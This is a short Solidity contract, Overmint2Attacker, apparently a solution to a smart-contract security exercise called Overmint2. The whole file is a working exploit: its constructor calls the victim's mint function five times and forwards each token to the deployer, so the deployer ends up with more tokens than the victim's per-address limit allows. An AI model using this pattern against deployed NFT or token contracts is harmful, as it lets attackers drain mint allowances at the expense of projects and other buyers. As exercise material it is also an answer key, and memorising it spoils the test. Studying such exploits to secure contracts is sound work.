// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.15;

import {IERC721} from "@openzeppelin/contracts/token/ERC721/IERC721.sol";

import {Overmint2} from "./Overmint2.sol";

contract Overmint2Attacker {
    constructor(Overmint2 victim_) {
        for (uint256 i = 0; i < 5; i++) {
            uint256 totalSupply = victim_.totalSupply();
            victim_.mint();
            IERC721(victim_).safeTransferFrom(address(this), msg.sender, totalSupply + 1);
        }
    }
}
